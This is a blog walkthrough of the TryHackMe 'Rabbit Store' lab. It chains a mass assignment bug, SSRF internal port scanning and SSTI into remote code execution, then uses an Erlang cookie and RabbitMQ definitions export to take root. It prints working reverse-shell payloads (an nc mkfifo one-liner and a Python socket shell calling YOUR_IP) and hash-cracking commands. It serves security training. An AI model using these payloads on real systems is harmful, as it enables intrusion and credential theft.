<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Rabbit Store</title>
<meta name=description content="Platform: TryHackMe Link: Rabbit Store Level: Medium OS: Linux Rabbit Store presents a couple of uncommon services. The challenge begins with identifying a mass …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/posts/thm-rabbit_store/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Rabbit Store"><meta property="og:description" content="Platform: TryHackMe Link: Rabbit Store Level: Medium OS: Linux Rabbit Store presents a couple of uncommon services. The challenge begins with identifying a mass …"><meta property="og:image" content="https://scorpiosec.com/images/THM-RabbitStore/RabbitStore.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-RabbitStore/RabbitStore.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Rabbit Store"><meta name=twitter:description content="Platform: TryHackMe Link: Rabbit Store Level: Medium OS: Linux Rabbit Store presents a couple of uncommon services. The challenge begins with identifying a mass …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/thm-rabbit_store/"><meta property="twitter:url" content="https://scorpiosec.com/posts/thm-rabbit_store/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-RabbitStore/RabbitStore.png"><link rel=canonical href=https://scorpiosec.com/posts/thm-rabbit_store/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/thm-rabbit_store/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Rabbit Store</h1><small role=doc-subtitle></small><p class=post-date>8 min read |
<span class=post-date>February 25, 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platform: TryHackMe</li><li>Link: <a href=https://tryhackme.com/room/rabbitstore>Rabbit Store</a></li><li>Level: Medium</li><li>OS: Linux</li></ul><hr><p>Rabbit Store presents a couple of uncommon services. The challenge begins with identifying a mass assignment vulnerability in an API, which is then leveraged alongside an SSRF vulnerability to retrieve the API documentation. One of the discovered endpoints is vulnerable to SSTI, allowing us to gain initial access to the target system. Through enumeration, we uncover an Erlang cookie, enabling us to pivot to another user. From there, we escalate our privileges by creating an admin user in RabbitMQ and exporting a file containing sensitive information, including the root user’s password hash. By properly formatting the hash, we ultimately retrieve the root password and achieve full system compromise.</p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -T4 -sC -sV -Pn -p- -oA nmap/Rabbit_Store {TARGET_IP}
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-02-24 21:15 CST
</span></span><span style=display:flex><span>Warning: 10.10.117.80 giving up on port because retransmission cap hit <span style=color:#56b6c2>(</span>6<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.117.80
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.19s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65521</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT      STATE    SERVICE      VERSION
</span></span><span style=display:flex><span>22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp    open     http         Apache httpd 2.4.52
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.52 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://cloudsite.thm/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3026/tcp  filtered agri-gateway
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>4369/tcp  open     epmd         Erlang Port Mapper Daemon
</span></span><span style=display:flex><span>| epmd-info: 
</span></span><span style=display:flex><span>|   epmd_port: <span style=color:#d19a66>4369</span>
</span></span><span style=display:flex><span>|   nodes: 
</span></span><span style=display:flex><span>|_    rabbit: <span style=color:#d19a66>25672</span>
</span></span><span style=display:flex><span>12606/tcp filtered unknown
</span></span><span style=display:flex><span>14949/tcp filtered unknown
</span></span><span style=display:flex><span>18309/tcp filtered unknown
</span></span><span style=display:flex><span>25672/tcp open     unknown
</span></span><span style=display:flex><span>25890/tcp filtered unknown
</span></span><span style=display:flex><span>26284/tcp filtered unknown
</span></span><span style=display:flex><span>35021/tcp filtered unknown
</span></span><span style=display:flex><span>52841/tcp filtered unknown
</span></span><span style=display:flex><span>59431/tcp filtered unknown
</span></span><span style=display:flex><span>62532/tcp filtered unknown
</span></span><span style=display:flex><span>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 1250.63 seconds
</span></span></code></pre></div><p>We find four open ports with Nmap:</p><ul><li>22 running SSH</li><li>80 running http, with a redirection to <code>cloudsite.thm</code></li><li>4369 running epmd</li><li>25672 (this is the Erlang Distribution port, used for RabbitMQ clustering)</li></ul><blockquote><p>The <code>epmd</code> service (Erlang Port Mapper Daemon) is used by Erlang applications to discover each other on a network.
<em>Read more about the service <a href=https://www.erlang.org/docs/26/man/epmd>here</a>.</em></p></blockquote><h2 id=enumeration>Enumeration</h2><p>We use <code>nc -vz {TARGET_IP} 25672</code> to verify the status of <code>RabbitMQ</code>.</p><p><img src=/images/THM-RabbitStore/rabbitMQ_test.png alt="RabbitMQ service test"></p><p>The output strongly suggests that <code>RabbitMQ</code> is running on the target.</p><blockquote><p>RabbitMQ is an open-source message broker that implements the Advanced Message Queuing Protocol (AMQP). It is used for asynchronous communication between applications, enabling them to send and receive messages without direct interaction.
<em>Learn more about it <a href=https://www.rabbitmq.com/>here</a>.</em></p></blockquote><p>At <code>http://cloudsite.thm</code> we find a website for a company providing cloud services.</p><p><img src=/images/THM-RabbitStore/website_RabbitStore.png alt="clousite website"></p><p>When trying to create an account we get redirected to <code>http://storage.cloudsite.thm/register.html</code>, we need to update the <code>/etc/hosts</code> file in order to access it.</p><p><img src=/images/THM-RabbitStore/signup_page.png alt="clousite signup page"></p><p>We create an account and try logging in, but we receive a message telling us that our account need to be activated at <code>http://storage.cloudsite.thm/dashboard/inactive</code>.</p><p><img src=/images/THM-RabbitStore/account_activation.png alt="account activation"></p><p>Noticing the <code>inactive</code> at the end of the url, we change it to <code>active</code> and get the message: <code>Your subscription is inactive. You cannot use our services.</code>. This seems to be an API endpoint.</p><p><img src=/images/THM-RabbitStore/api_inactive_.png alt="API inactive"></p><p>We login again and intercept the request this time. We see a POST request to <code>/api/login</code>. Its response contains a JWT (JSON Web Token), and we can see the <code>inactive</code> at the end (the current status of our account/subscription).</p><p><img src=/images/THM-RabbitStore/JWT_login.png alt="POST request to /api/login"></p><p>Let&rsquo;s try to find more API endpoints with ffuf.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://storage.cloudsite.thm/api/FUZZ -ic -fc 404
</code></pre><p>We discover a few more but we cannot access the last two:</p><ul><li><code>/register</code></li><li><code>/docs</code></li><li><code>/uploads</code></li></ul><p><img src=/images/THM-RabbitStore/api_ffuf.png alt="directory brute forcing on /api"></p><p><img src=/images/THM-RabbitStore/api_docs.png alt="access denied to /api/docs"></p><p><img src=/images/THM-RabbitStore/api_uploads.png alt="access denied to /api/uploads"></p><h3 id=mass-assignment-vulnerability>Mass Assignment vulnerability</h3><p>We use <a href=https://jwt.io/>jwt.io</a> to analyze the token. We indeed see that our subscription is marked as <code>inactive</code> in the decoded payload.</p><p><img src=/images/THM-RabbitStore/decoded_JWT.png alt="decoded JWT"></p><p>We register an account and manually add <code>"subscription":"active"</code> to the POST request to <code>/api/register</code>.</p><p><img src=/images/THM-RabbitStore/mass_assign.png alt="mass assignment vulnerability"></p><p>Our request is successful!</p><p><img src=/images/THM-RabbitStore/mass_assign1.png alt="mass assignment vulnerability successful"></p><p>We login and now have access to <code>http://storage.cloudsite.thm/dashboard/active</code>, where we find a file upload feature.</p><blockquote><p>The vulnerability we exploited is known as a mass assignment vulnerability. It occurs when an API allows the modification of fields that should not be directly manipulated by users, such as sensitive or internal attributes.</p></blockquote><h3 id=exploiting-ssrf>Exploiting SSRF</h3><p>We can upload a file from our computer or from an url.</p><p><img src=/images/THM-RabbitStore/dashboard_active.png alt="access to /dashboard/active"></p><p><img src=/images/THM-RabbitStore/upload_url.png alt="upload files from url option"></p><p>A feature accepting a user submitted URL can possibly mean an SSRF vulnerability so let&rsquo;s test that.</p><p>We create a test file and start a python server on our local machine.</p><pre tabindex=0><code>echo &#39;let_me_in&#39; &gt; SSRF_test.txt

python3 -m http.server
</code></pre><p><img src=/images/THM-RabbitStore/SSRF_vuln_test.png alt="SSRF vulnerability test"></p><p>On the website we enter the url for our web server.</p><pre tabindex=0><code>http://{YOUR_IP}:{PORT}/{FILENAME}
</code></pre><p><img src=/images/THM-RabbitStore/url_sub.png alt="file submission via url"></p><p>It works, we receive a request on our web server and the file is successfully uploaded on the target.</p><p><img src=/images/THM-RabbitStore/ssrf_200.png alt="http 200 on web server"></p><p><img src=/images/THM-RabbitStore/upload.png alt="file successfully stored on the target"></p><p>After refreshing the page we can see it under <code>Uploaded Files</code>.</p><p><img src=/images/THM-RabbitStore/uploaded_files.png alt="uploaded file list"></p><p>When we click on the file link under <code>Uploaded Files</code>, there is a GET request sent to <code>/api/uploads/xxxxxxxxx</code>. This is used to download files.</p><p><img src=/images/THM-RabbitStore/api_uploads_req.png alt="GET request to /api/uploads"></p><p>Also we can now access <code>http://storage.cloudsite.thm/api/uploads</code>.</p><p><img src=/images/THM-RabbitStore/api_uploads_access.png alt="successful access to /api/uploads"></p><p>The URL upload function sends a request to <code>/api/store-url</code>.</p><p><img src=/images/THM-RabbitStore/api_store_url.png alt="request to /api/store-url"></p><p>We will try to access <code>/api/docs</code> via the SSRF.</p><p><img src=/images/THM-RabbitStore/SSRF_api_docs_1.png alt="Attempt to access /api/docs via SSRF"></p><p>The request is successful but the file downloaded only contains a <code>404</code> error.</p><p><img src=/images/THM-RabbitStore/404_file_dl.png alt="downloaded file contains 404 error"></p><h4 id=ssrf-internal-port-scanning>SSRF Internal Port Scanning</h4><p>Let&rsquo;s try to find some internal open ports on the target.</p><blockquote><p>The same method is used in <a href=https://scorpiosec.com/posts/thm-creative/#ssrf-internal-port-scanning>THM: Creative</a>.
All these parameters are from the POST request to <code>/api/store-url</code>.</p></blockquote><pre tabindex=0><code>ffuf -u &#34;http://storage.cloudsite.thm/api/store-url&#34; \
-X POST \
-H &#34;Content-Type: application/json&#34; \
-H &#34;Cookie: jwt=YOUR_JWT_VALUE&#34; \
-d &#39;{&#34;url&#34;:&#34;http://127.0.0.1:FUZZ&#34;}&#39; \
-w &lt;(seq 1 65535) \
-mc all \
-t 100 \
-fs 41
</code></pre><p>We discover a few ports.</p><p><img src=/images/THM-RabbitStore/SSRF_internal_ports.png alt="Internal port scan via SSRF"></p><p>We will try to reach <code>/api/docs</code>.</p><pre tabindex=0><code>http://127.0.0.1:3000/api/docs
</code></pre><p><img src=/images/THM-RabbitStore/api_docs_upload.png alt="second attempt to access /api/docs"></p><p>This time we get the correct file, detailing all the API endpoints. We already knew most of them, the new one is <code>/api/fetch_messeges_from_chatbot</code>.</p><p><img src=/images/THM-RabbitStore/api_docs_file.png alt="Successfully retrieve /api/docs"></p><h3 id=exploiting-ssti>Exploiting SSTI</h3><p>The file tells us that we need to use a POST request to access it. So let&rsquo;s first capture the request to <code>http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot</code>.</p><p>As expected we get <code>GET method not allowed</code>.</p><p><img src=/images/THM-RabbitStore/GET_chatbot.png alt="GET request to /api/fetch_messeges_from_chatbot"></p><p>We change it to a POST request a send it again, now we have a 500 error.</p><p><img src=/images/THM-RabbitStore/internal_error_chatbot.png alt="http 500 error to POST request"></p><p>Since we are interacting with the API let&rsquo;s add <code>Content-Type: application/json</code> to our request and try to send some random parameters.</p><p><img src=/images/THM-RabbitStore/custom_req_chatbot.png alt="username parameter required"></p><p>It tells us that a username parameter is required. After adding it, we are told that the chatbot is under development. We notice that the answer includes the username we sent and any different name produces the same response.</p><p>There is probably some kind of template akin to this: <code>Sorry, $username, our chatbot server is currently under development.</code></p><p><img src=/images/THM-RabbitStore/chatbot_response.png alt="successful POST request to /api/fetch_messeges_from_chatbot"></p><p>We will test for an SSTI (Server Side Template Injection) vulnerability. On <a href=https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#identify>HackTricks</a> we find plenty of payloads.</p><p>The payload is indeed executed!</p><p><img src=/images/THM-RabbitStore/SSTI_confirmed.png alt="SSTI confirmed"></p><h2 id=initial-foothold-shell-as-azrael>Initial Foothold (shell as azrael)</h2><p>Although the payload works I am wondering why that is the case &#x1f914;.</p><p>Because this application uses the Express framework and <code>{{7*7}}</code> is a payload for <code>Jinja2 (Python)</code>.</p><p><img src=/images/THM-RabbitStore/rabbit_store_techstack.png alt="Rabbit Store tech stack"></p><p>We attempt to gain a reverse shell with the following payload:</p><pre tabindex=0><code>{{ config.__class__.__init__.__globals__[&#39;os&#39;].system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc YOUR_IP PORT_NUMBER &gt;/tmp/f&#39;) }}
</code></pre><p><img src=/images/THM-RabbitStore/SSTI_RCE.png alt="SSTI for RCE"></p><p>After sending the request we get a shell as <code>azrael</code> on our listener. We can also upgrade the shell with the commands below.</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><p><img src=/images/THM-RabbitStore/user_flag.png alt="foothold and user flag"></p><h3 id=shell-as-rabbitmq>Shell as rabbitmq</h3><p>Linpeas finds an Erlang file called <code>.erlang.cookie</code> in <code>/var/lib/rabbitmq/</code>. The file is owned by the <code>rabbitmq</code> user.</p><p><img src=/images/THM-RabbitStore/erlang_file.png alt="Erlang file found"></p><p>We recall from our nmap scan that we found ports <code>4369</code> and <code>25672</code> open.</p><p>On <a href=https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection>this HackTricks page</a> we learn a few methods to achieve RCE using the Erlang cookie. However we need to slightly modify the command, instead of <code>couchdb@localhost</code> we use <code>rabbit@forge</code> (forge is the target hostname).</p><pre tabindex=0><code>HOME=/ erl -sname kscorpio -setcookie CCOKIE_FOUND


rpc:call(&#39;rabbit@forge&#39;, os, cmd, [&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;YOUR_IP\&#34;, PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;&#34;]).
</code></pre><p><img src=/images/THM-RabbitStore/erl_rce.png alt="Erlang Cookie RCE"></p><p>On our listener we now have a shell as <code>rabbitmq</code>.</p><p><img src=/images/THM-RabbitStore/rabbitmq_shell.png alt="rabbitmq shell"></p><p>Now that we are <code>rabbitmq</code> we can use <code>rabbitmqctl</code>. We first try <code>list_users</code> but it returns an error.</p><pre tabindex=0><code>rabbitmqctl list_users
</code></pre><p><img src=/images/THM-RabbitStore/list_users.png alt="failed rabbitmq list_users command"></p><p>We correct the file permissions and run the command again.</p><pre tabindex=0><code>chmod 400 /var/lib/rabbitmq/.erlang.cookie
</code></pre><p><img src=/images/THM-RabbitStore/rabbitmq_list_users.png alt="successful rabbitmq list_users command"></p><p>We get the message:</p><pre tabindex=0><code>The password for the root user is the SHA-256 hashed value of the RabbitMQ root user&#39;s password. Please don&#39;t attempt to crack SHA-256.
</code></pre><h2 id=privilege-escalation-shell-as-root>Privilege Escalation (shell as root)</h2><p>We learn <a href=https://www.rabbitmq.com/docs/definitions>here</a> that RabbitMQ stores information in <code>definitions</code>, these files can be exported as a JSON file. We can abuse our privileges to create a new user and do just that.</p><pre tabindex=0><code>rabbitmqctl add_user kscorpio kscorpio 
rabbitmqctl set_permissions -p / kscorpio &#34;.*&#34; &#34;.*&#34; &#34;.*&#34;
rabbitmqctl set_user_tags kscorpio administrator
rabbitmqadmin export rabbit.definitions.json -u kscorpio -p kscorpio
</code></pre><p><img src=/images/THM-RabbitStore/rabbitmq_privesc.png alt="rabbitmq export definitions"></p><p>Inside the file we find the root password hash.</p><p><img src=/images/THM-RabbitStore/rabbitmq_pwd_hash.png alt="root password hash in json file"></p><p>To crack a RabbitMQ hash with a tool like hashcat we need to format it first. On <a href=https://github.com/QKaiser/cottontail/issues/27>this Github issue page</a>, we learn how to do it.</p><pre tabindex=0><code>echo &#34;RABBITMQ_HASH&#34; | base64 -d | xxd -pr -c128 | perl -pe &#39;s/^(.{8})(.*)/$2:$1/&#39; &gt; hash.txt


hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><blockquote><p>For our case we do not need the second step.</p></blockquote><p>The documentation <a href=https://www.rabbitmq.com/docs/passwords#hash-via-http-api>here</a> let us know that the hashes use a <code>32 bit</code> (4 bytes) salt and we know that: &ldquo;the password for the root user is the SHA-256 hashed value of the RabbitMQ root user&rsquo;s password&rdquo;.</p><p>So the password is simply all the characters minus the salt (our formatted hash has already separated the two for us). We use it and are able to read the root flag.</p><p><img src=/images/THM-RabbitStore/root_pwd.png alt="root password"></p><p><img src=/images/THM-RabbitStore/root_flag.png alt="access to the root account"></p><h2 id=additional-resources>Additional Resources</h2><p>This room is a great introduction to some novel exploitation (at least for me). Below are some additional resources to practice the featured vulnerabilities:</p><ul><li>Learn about mass assignment vulnerabilities with PortSwigger <a href=https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability>here</a>.</li><li>Learn about <a href=https://portswigger.net/web-security/ssrf>SSRF</a> and <a href=https://portswigger.net/web-security/server-side-template-injection>SSTI</a> from PortSwigger.</li><li>Erlang Cookie RCE methods are available <a href=https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection>here</a>.</li></ul></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-yummy/>&#8592;
Previous:
HTB: Yummy</a></p><p class=prev-post-date>February 22, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#mass-assignment-vulnerability>Mass Assignment vulnerability</a></li><li><a href=#exploiting-ssrf>Exploiting SSRF</a><ul><li><a href=#ssrf-internal-port-scanning>SSRF Internal Port Scanning</a></li></ul></li><li><a href=#exploiting-ssti>Exploiting SSTI</a></li></ul></li><li><a href=#initial-foothold-shell-as-azrael>Initial Foothold (shell as azrael)</a><ul><li><a href=#shell-as-rabbitmq>Shell as rabbitmq</a></li></ul></li><li><a href=#privilege-escalation-shell-as-root>Privilege Escalation (shell as root)</a></li><li><a href=#additional-resources>Additional Resources</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>